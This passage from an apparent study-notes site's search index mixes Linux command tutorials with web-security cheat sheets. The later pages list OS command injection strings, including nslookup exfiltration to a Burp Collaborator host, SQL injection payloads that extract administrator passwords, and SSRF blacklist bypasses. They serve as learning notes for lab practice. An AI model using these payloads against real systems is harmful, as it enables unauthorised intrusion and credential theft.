Besides this I like watching anime, movies, series and love learning new things.\n"},"Linux/1-Basics/":{"url":"Linux/1-Basics/","title":"Basics","keywords":"","body":"In this section you will learn:\n\nHow to explore your system.\nHow to navigate through your system.\nHow to manipulate files and directories (copying, moving, deleting etc.).\nHow to efficiently work with commands.\nHow to combine commands to do powerful stuff.\nAdvance keyboard tricks to make life easier.\nManage file permissions.\nManage all the processes running in your system.\nHow to configure your environment.\nMaster the most powerful text editor Vi.\nHow to customize your prompt.\n\n"},"Linux/1-Basics/1-exploring.html":{"url":"Linux/1-Basics/1-exploring.html","title":"Exploring","keywords":"","body":"Exploring the filesystem\nfile command\n\nIn Linux file extensions don't mean anything, you could name .txt file image.jpeg and it would still work.\nSo how do we identify what type of file it really is? This is where file command comes in.\nUsage: file pathToFile\nExample:\nfile ~/Pictures/thousandYearsOfPain.jpeg\n\n\n\nless\n\nVery frequently we feel the need to check the contents of the file.

If the file is deleted before the symbolic link, the link will continue to exist but will point to nothing.\nExamples:\nln -s ninja.scroll secret/forbidden.jutsu\nln -s acev2.txt ace.txt\n\n\n\nHard links\n\nBy default, every file has a single hard link that gives the file its name.\nWhen we create a hard link, we create an additional directory entry for a file.\nUnlike a symbolic link, when you list a directory containing a hard link, you will see no special indication of the link.\nA hard link cannot reference a file outside its own file system. This means a link cannot reference a file that is not on the same disk partition as the link itself.\nA hard link may not reference a directory.\nIf you write something to the hard link, the referenced file is written to.\nWhen a hard link is deleted, the link is removed, but the contents of the file itself continue to exist (that is, its space is not deallocated) until all links to the file are deleted.\nExamples:\nln momo dimsums\n\n\n\n"},"Linux/1-Basics/2-navigation.html":{"url":"Linux/1-Basics/2-navigation.html","title":"Navigation","keywords":"","body":"Basic navigation commands\npwd - present working directory\n\nUsing this command you can print the location of the directory you are working in.\nUsage: pwd\n\ncd - change directory\n\nUsing this command you can change your current working directory.\nUsage: cd path_to_directory\nIt accepts both absolute and relative paths\nShortcut for home is ~\nShortcut for previous working directory is -\nShortcut for someone else's home directory is ~username\nTo go to home dir just type cd\nExamples: \ncd ../parent\ncd ./child/grandChild\ncd /home/itachi/sharingan/ or cd ~/sharingan\ncd (will take you to home dir)\ncd ~levi (cd to levi's home directory)\n\n\n\nls - list\n\nUsing this command you can list the contents of any directory, as long as you have proper permissions.\nUsage: ls path\nThe file names starting with period (.) are hidden in linux.\nTo list the hidden files use -a flag.\nTo print additional info about the files and directories in linux use the -l flag, it stands for long list.\nTip: ll is an alias for ls -l\nIt accepts relative and absolute paths.\nYou can even specify multiple locations seperated by spaces.\nUse -h flag to display file sizes in human readable format rather than in bytes.\nLong list:\nExamples:\n-rw-r--r-- 1 sup3r541y4n sup3r541y4n 2180 Dec  5 20:43  navigation.md\ndrwxr-xr-x 1 sup3r541y4n sup3r541y4n 184 Dec  5 20:41 Linux\n\n\nThe first character represents the type of file (directory(d), file(-), symbolic link(l), character special file(c) and block special file(b))\nThe next 3 characters represent the file permissions of the owner (read(r), write(w) and execute(x))\nRead:\nFile: Allows a file to be opened and read.\nDirectory: Allows a directory’s contents to be listed if the execute attribute is also set.\n\n\nWrite:\nFile: Allows a file to be written to or truncated; however, this attribute does not allow files to be renamed or deleted.

If the setgid bit is set on a directory, newly created files in the directory will be given the group ownership of the directory rather the group ownership of the file’s creator.\nSticky bit (octal 1000), if applied to a directory, it prevents users from deleting or renaming files unless the user is either the owner of the directory, the owner of the file, or the superuser.

With this we can redirect the output to a seperate file.\nExamples:\ngunzip file.txt.gz\ngunzip -c file.txt.gz > file.dat\n\n\n\nbzip2\n\nThe bzip2 program, by Julian Seward, is similar to gzip but uses a different compression algorithm that achieves higher levels of compression at the cost of compression speed.\nUsage: bzip2 [flags and input files in any order]\nUse the -d flag to uncompress files compressed using bzip2. We can also use bunzip2 program for this.\nUse -1 for fast compression.\nUse -9 for best compression.\nUse the -c flag to write on stdout, keep original files unchnged. With this we can redirect the output to a seperate file.\nbzip2 also comes with the bzip2recover program, which will try to recover damaged .bz2 files.\nExamples:\nbzip2 -9 file.txt\nbzip2 -1 -c file.txt > f.bz2\nbzip2 -d file.txt.bz2\n\n\n\nbunzip2\n\nIt performs the same action as the -d flag in bzip2. It is used to uncompress files compressed by bzip2.\nUsage: gunzip [OPTION]... [FILE]...\nUse the -c flag to write on stdout, keep original files unchnged. With this we can redirect the output to a seperate file.\nExamples:\nbunzip2 file.txt.bz2\nbunzip2 -c file.txt.bz2 > file.dat\n\n\n\nArchiving files\n\nArchiving is the process of gathering up many files and bundling them together into a single large file. \nArchiving is often done as part of system backups.\n\ntar\n\nthe tar program is the classic tool for archiving files. Its name, short for tape archive, reveals its roots as a tool for making backup tapes.\nUsage: tar [options] pathname...\nUse the -c flag to create archives.\nUse the -f flag to specify the archive name.\nUse the -t flag to list the contents of an archive.\nUse the -x flag to extract all the files from the archive.\nExamples:\ntar -cf archive.tar foo bar\ntar -tvf archive.tar\ntar -xf archive.tar\n\n\n\nzip\n\nThe zip program is both a compression tool and an archiver.\nUsage: zip [options] zipfile file\nUse the -r flag for recursion.\nIt is possible to pipe a list of filenames to zip via the -@ option.\nExamples:\nzip -r playground.zip playground\nfind playground -name \"file-A\" | zip -@ file-A.zip\n\n\n\nunzip\n\nIt is used to extract files from zip archive.\nUsage: unzip [OPTIONS] ziparchive\nExample:\nunzip test.zip\n\n\n\nrsync\n\nThis program can synchronize both local and remote directories by using the rsync remote-update protocol, which allows rsync to quickly detect the differences between two directories and perform the minimum amount of copying required to bring them into sync.\nUsage: rsync [OPTIONS] source destination\nEither the source or destination should be local, remote to remote is not supported.\nExamples:\nsudo rsync -av --delete /etc /home /usr/local /media/BigDisk/backup\nrsync -av –delete rsync://archive.linux.duke.edu/fedora/linux/development/rawhide/Everything/x86_64/os/ fedora-devel\n\n\n\n"},"Linux/2-TasksAndTools/6-regularExpressions.html":{"url":"Linux/2-TasksAndTools/6-regularExpressions.html","title":"Regular Expressions","keywords":"","body":"Match patterns like a pro\nRegex or regular expressions are a way to match patterns in text, it is kind of like a language. The reason it is an important part of linux is that many programs in linux use regular experessions and by learning them you can become an advanced user.\nMetacharacters\n\nThese are some special characters used in regular expressions to match complex patterns.\nSome of these metacharacters are: ^, $, ., [ ], { }, -, ?, +, *, ( ), |, \\ etc.\nMoving on we'll learn about these metacharacters one by one.\n\nThe caret (^) sign\n\nIt is used to match the start of a line.\nFor example if we want to match the line that starts with \"Because\", we can do this:\n^Because\n\n\n\nThe dollar ($) sign\n\nIt is used to match the end of the line.\nFor example if we want to match the line that ends with \"bye\", we can do this:\nbye$\n\n\n\nMatch anything using (.)\n\nSo the . character in regular expression can match any other character.\nFor example if you are matching 3 letter words starting with \"ma\", like \"man\", \"map\", \"mam\", \"may\", \"mac\" etc. We can do this:\nma.\n\n\nTo be honest a better way to search for 3 letter words starting with \"ma\", would be this:\n\\bma.\\b\n\n\n\\b matches the beginning or end of a word.\n\nCreate character classes ([ ]) and specify ranges (-)\n\nCharacter classes are a way to match a character from the given list of characters.\nFor example:\n[bch]atman can match \"batman\", \"catman\" or \"hatman\"\n\n\nThe above regular expression does not match \"bcfatman\" as beginners sometimes misunderstand.\nYou can also give ranges for the character classes using hyphen.\nPre-built character classes:\n\\d - Matches any digit [0-9].\n\\D - Matches everything except digit [^0-9].\n\\w - Matches any character, digit or underscore [a-zA-Z0-9_].\n\\W - Matches everything except character, digit or underscore [^a-zA-Z0-9_].\n\\s - Matches space, tab, carriage return, line feed or form feed. [ \\t\\r\\n\\f].\n\\S - Matches everything except space, tab, carriage return or form feed [^ \\t\\r\\n\\f].\n\n\nExamples:\n[a-zA-Z0-9]\n[a-z0-9]\n[A-H]atman\n[a-z\\-] - Matches lowercase characters and hyphen (-)\n\n\n\nMatch a number of characters at a time ({ })\n\nYou can match some pattern a minimum, maximum or fixed number of times using braces.\nLet's create a regex for an IP address.\nAn IP address is of the format: \nsomeNumberBetween0-255.someNumberBetween0-255.someNumberBetween0-255.someNumberBetween0-255\n\n\nSo we can say in regex it is:\n[0-9] (minimum 1 to maximum 3), yes it will include numbers out the range 0-255 but let's get to that later.\nSo we can write the above expression as \\d{1,3}\nAfter the number we have a full stop but we need to escape it since fullstop is a metacharacter in regex.\nSo it becomes \\d{1,3}\\.\n\n\nNow we can to repeat this whole pattern 3 times, so it becomes:\n(\\d{1,3}\\.){3} Here we grouped the whole previous pattern using (), we'll learn about it later.\n\n\nNow at last their is one more number which can be minimum 1 digit to maximum 3 digits.\n(\\d{1,3}\\.){3}\\d{1,3}\n\n\n\n\nNow if we want to be strict with the 0-255 range we can do something like this:\n((1?\\d{1,2}|2[0-5]{2})\\.){3}(1?\\d{1,2}|2[0-5]{2})\n\n\n\nMatch zero or one times (?)\n\nYou can match a character zero or one time using ?, it is helpful when a character may or may not exist in string.\nFor example if we want to match a phone number it may or may not have + symbol in the beginning:\n\\+?91-\\d{10}\n\n\n\nMatch one or more times (+)\n\nYou can match a character one or more times using +, it is helpful when you want the character to be matched atleast once.\nSo if we want to match \"Baby shark do do do do...\", we can do this:\nBaby shark (do\\s?)+\n\nMatch zero or more times (*)\n\nYou can match a character zero or more times using *.\nExample if we want to match any tag in html, we can do this:\n\n\n\n\nGrouping (( ))\n\nWe can group parts of our regex to specify the number of times they should be matched or to output the groups seperately (possible in many programming languages).\nLike in the IP address example we looked before we grouped parts of it to match them a specific number of times using braces { }\nExamples:\n((1?\\d{1,2}|2[0-5]{2})\\.){3}(1?\\d{1,2}|2[0-5]{2})\nBaby shark (do\\s?)+\n\n\n\nOr operator (|)\n\nThis is used when one of the specified pattern/string may be present but we're not sure which one.\nExample:\nbat(man|woman) - This will match \"batman\" or \"batwoman\"\n\n\nThe above example can also be done like this:\nbat(wo)?man\n\n\n\nEscape character (\\)\n\nMany times we want to use characters like +, *, ?, $ or ^ as normal characters in our regex.\nTo do that we can use \\ to escape those metacharacters.\nExample:\n\\+1 \\(\\d{3}\\) \\d{3}\\-\\d{4} - Matches US phone numbers\n\n\n\nNegation (^)\n\nWhen the caret symbol is used with character classes, it negates that character class.\nExample:\n[^A-Z] - Matches everything except uppercase alphabets.\n\n\n\ngrep - global regular expression print\n\nThis is a program that can use regular expression to find patterns in files.\nUsage: grep [OPTIONS]  [FILE...]\nUse the -i or --ignore-case flag to do a case-insensitive match.\nUse the -v or --invert-match flag to print lines without the pattern.\nUse the -l flag to only output file name of match.\nUse the -c flag for count of matches.\nUse the -n flag for number of line match was found on.\nUse the -P flag for perl style regex use.\nUse the -r flag for recursive search inside a directory.\nUse the -o flag to output only what matched.\nExamples:\ngrep -Pn \"Baby shark (do\\s?)+\" babyShark.lrc\ngrep -ron \"John Doe\" ./dir/\ngrep -Pic \"Bat(wo)?man\" batmanChronicles.script\n\n\n\nfind command\n\nYou can use the -regex flag in find command to do pattern matching.\nExample:\nfind . -regex '.*[^-_./0-9a-zA-Z].*'\n\n\n\nlocate command\n\nYou can use the --regex flag in locate command to do pattern matching.\nExample:\nlocate --regex 'bin/(bz|gz|zip)'\n\n\n\n"},"Web/ServerSideTopics/":{"url":"Web/ServerSideTopics/","title":"Server Side","keywords":"","body":"In this section you will learn:\n\nAccess vontrol vulnerabilities\nAuthentication flaws\nDirectory traversal vulnerability\nInformation disclosure\nOS command injection\nSQL injection\nServer side request forgery\nServer side template injection\nXML external entities\n\n"},"Web/ServerSideTopics/AccessControl.html":{"url":"Web/ServerSideTopics/AccessControl.html","title":"Access Control Flaws","keywords":"","body":"Vertical privilege escalation\nUnprotected functionality\n\nFind admin functionality\nCheck robots.txt\nBrute-force locations\nThe URL might be disclosed in JavaScript that constructs the user interface based on the user's role\n\nParameter-based access control methods\n\nIf there is admin=false parameter in requests or something similar try fiddling with that.\nIf there is a functionality to change something related to your profile try changing your access with that.

Although these comments are not visible on the rendered page, they can easily be accessed using Burp, or even your browser's built-in developer tools. \n\nError messages\n\nOne of the most common causes of information disclosure is verbose error messages. As a general rule, you should pay close attention to all error messages you encounter during auditing. \n\nDebugging data\n\nFor debugging purposes, many websites generate custom error messages and logs that contain large amounts of information about the application's behavior. While this information is useful during development, it is also extremely useful to an attacker if it is leaked in the production environment.\n\nSource code disclosure via backup files\n\nThese temporary files are usually indicated in some way, such as by appending a tilde (~) to the filename or adding a different file extension. Requesting a code file using a backup file extension (.bak) can sometimes allow you to read the contents of the file in the response.\n\nInformation disclosure due to insecure configuration\n\nWebsites are sometimes vulnerable as a result of improper configuration. This is especially common due to the widespread use of third-party technologies, whose vast array of configuration options are not necessarily well-understood by those implementing them. For example, the HTTP TRACE method is designed for diagnostic purposes. If enabled, the web server will respond to requests that use the TRACE method by echoing in the response the exact request that was received. This behavior is often harmless, but occasionally leads to information disclosure, such as the name of internal authentication headers that may be appended to requests by reverse proxies. \n\n"},"Web/ServerSideTopics/OS-Command-Injection.html":{"url":"Web/ServerSideTopics/OS-Command-Injection.html","title":"OS Command Injection","keywords":"","body":"OS Command Injection:\n\n& whoami &\n|whoami\necho hello\n|| whoami ||\n\nBlind OS Command Injection:\n\n& ping -c 10 127.0.0.1 & (This is will send 10 ICMP packets, so there will be time delay)\n||whoami > /var/www/html/whoami.txt\n\nShell metacharacters for OS Command Injection\nWindows and Unix:\n\n&\n&&\n|\n||\n\nUnix only:\n\n;\nNewline (0x0a or \\n)\n\nInline execution of an injected command within the original command (Unix only):\n\n`injected command`\n$(injected command)\n\nData exfiltration through OS Command Injection (OAST):\n\n||nslookup 9jtnjcnvxt3qxavtcqhp252vemkc81.burpcollaborator.net||\n||nslookup `whoami`.hacker.burpcollaborator.net||\n\n"},"Web/ServerSideTopics/SQLI.html":{"url":"Web/ServerSideTopics/SQLI.html","title":"SQL Injection","keywords":"","body":"Find the number of columns being fetched:\n\n' ORDER BY 1 -- \n' UNION SELECT NULL,NULL --\n' UNION SELECT NULL FROM DUAL --\n\nFinding columns with a useful data type:\n\n' UNION SELECT 'a',NULL,NULL,NULL --\n' UNION SELECT NULL,'a',NULL,NULL --\n' UNION SELECT NULL,NULL,'a',NULL --\n' UNION SELECT NULL,NULL,NULL,'a' --\n\nFinding the info of database:\nType and version:\n\nSELECT @@version\nSELECT * FROM v$version\nSELECT version()\n\nName:\n\nSELECT database()\n\nTables:\n\nSELECT table_name FROM information_schema.tables WHERE table_schema=\"db_name\"\n\nColumns:\n\nSELECT column_name FROM information_schema.columns WHERE table_schema=\"db_name\" AND table_name=\"table_name\"\n\nOracle tables:\n\nSELECT * FROM all_tables\n\nOracle columns:\n\nSELECT * FROM all_tab_columns WHERE table_name = 'USERS'\n\nMultiple values within a single column:\nOracle concat (||) operator:\n\n' UNION SELECT username || '~' || password FROM users -- \n\nBlind SQLI:\nConditional respose sqli:\n\n' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm\n\nInducing conditional responses by triggering SQL errors:\n\n' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a\n' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a \n' AND (SELECT CASE WHEN (SUBSTR(password,13,1)='n') THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a\n\nSQLI Cheatsheet\n\nhttps://portswigger.net/web-security/sql-injection/cheat-sheet\n\n"},"Web/ServerSideTopics/SSRF.html":{"url":"Web/ServerSideTopics/SSRF.html","title":"Server Side Request Forgery","keywords":"","body":"Basic SSRF against the local server\n\nIf the request is accessing an endpoint through http request, modify that and try to fetch something through http://localhost\n\nBasic SSRF against another back-end system\n\nIf the request is accessing an endpoint through http request, modify it and try to fetch an internal system http://192.168.x.x:8080/admin\n\nBlacklist (Most of the times http://localhost & http://127.0.0.1 is banned from being accessed)\n\nhttp://127.1\nhttp://2130706433\nhttp://017700000001\nregister your own domain name that resolves to 127.0.0.1Obfuscating blocked strings using URL encoding or case variation.- Always try these step by step\n\nFirst try: http://localhost/ then http://127.0.0.1/ then http://127.1/ then http://2130706433 then http://017700000001\nIf any of them works, then try to query out some internal resource like http://127.1/admin\nIf that gets blocked try to url encode some characters in admin and so on...\nKeep bypassing\n\nWhitelist\n\nYou can embed credentials in a URL before the hostname, using the @ character.
